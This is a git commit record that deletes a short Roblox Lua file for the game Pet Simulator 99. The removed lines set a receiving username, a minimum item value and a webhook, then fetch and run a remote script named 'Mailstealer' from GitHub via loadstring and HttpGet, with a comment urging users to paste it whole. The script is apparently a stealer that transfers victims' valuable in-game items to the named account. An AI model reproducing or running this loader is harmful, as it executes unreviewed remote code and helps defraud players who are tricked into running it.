515427183c73ab4a439417302f7d6a8d4e704b1e
Salesman <samyberri7@gmail.com>
2025-03-26 12:36:32 +0100

    Delete Main.lua

--- Main.lua
+++
@@ -1,6 +0,0 @@
-Username = "Samyb79"
-Username2 = "Samyb79"
-MinimumRAP = 1000000
-Webhook = ""
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Salesman10/Pet-Simulator-99-/refs/heads/main/Mailstealer", true))() -- copy the whole thing, even the username =
